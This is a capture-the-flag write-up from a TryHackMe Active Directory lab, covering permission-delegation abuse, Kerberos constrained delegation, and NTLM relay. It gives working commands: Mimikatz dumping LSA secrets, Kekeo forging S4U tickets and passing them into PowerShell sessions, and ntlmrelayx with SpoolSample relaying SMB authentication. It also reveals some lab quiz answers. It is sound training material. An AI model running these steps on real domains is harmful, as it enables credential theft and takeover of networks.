### Exploiting Permission Delegation

1. Which ACE would allow you to update any non-protected parameter of a target object?

   The answer can be found in the text.

2. What is the value of the flag stored on the Desktop of the Administrator user on THMWRK1 (flag1.txt)?

   Add-ADGroupMember "IT Support" -Members "lorraine.gill"
   Get-ADGroupMember "IT Support"

### Exploiting Kerberos Delegation

1. Which Kerberos Delegation type allows for delegation of all services?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Unconstrained Delegation</details>

2. Which Kerberos Delegation type allows the service to specify who is allowed to delegate to it?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Resource-Based Constrained Delegation</details>

3. Which Constrained Delegation service allows access to the file system of the system via delegation?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>CIFS</details>

4. What is the value of the flag stored in the Desktop directory of the Administrator user on THMSERVER1 (flag2.txt)?

   Using `Import-Module C:\Tools\PowerView.ps1` and `Get-NetUser -TrustedToAuth`, we can see that `svcIIS` has delegate permissions.

   PERMISSIONS
   
   Make sure to be logged in to our t2 admin account and load mimikatz to dump the lsa secrets.

   ```cmd
   C:\Tools\mimikatz_trunk\x64\mimikatz.exe
   token::elevate
   lsadump::secrets
   ```

   LSADUMP

   Now we can use `Kekeo` to generate a TGT for HTTP and WSMAN services.

   ```cmd
   C:\Tools\kekeo\x64\kekeo.exe
   tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:
   ```

   TGT

   Now that we have the TGT we can use it to forge TGS request for our svcIIS account. 

   ```cmd
   tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_duncan.moran /service:http/THMSERVER1.za.tryhackme.loc

   tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_duncan.moran /service:wsman/THMSERVER1.za.tryhackme.loc
   ```

   TGS

   In Mimikatz we set our token to default again and import the TGS tickets.

   ```cmd
   kerberos::ptt TGS_t1_duncan.moran@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

   kerberos::ptt TGS_t1_duncan.moran@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
   ```

   IMPORT

   Last step is to now create a new PSSession and connect through it to thmserver1.

   ```
   New-PSSession -ComputerName thmserver1.za.tryhackme.loc
   Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
   ```

   SESSION

   Once we are on the server we can find our flag.

### Exploiting Automated Relays

1. How often (in days) are the passwords of Windows machine accounts rotated by default?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>30</details>

2. What should not be enforced if we want to relay an SMB authentication attempt?

3. What is the value of the flag stored in the Desktop directory of the Administrator.ZA user on THMSERVER1 (flag3.txt)?

   First, we should setup the relay on our attackbox.

   ```cmd
   python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -smb2support -t smb://"10.200.60.201" -debug
   ```
   
   SETUP

   Now we create a request from the workstation.
   
   ```cmd
   C:\Tools\SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.50.57.135"
   ```
   
   REQUEST

   We receive a hash dump from thmserver1 which we can use to login and get the flag. 

   CREDENTIALS

   In this case, I will use the previously gained access to get the flag.
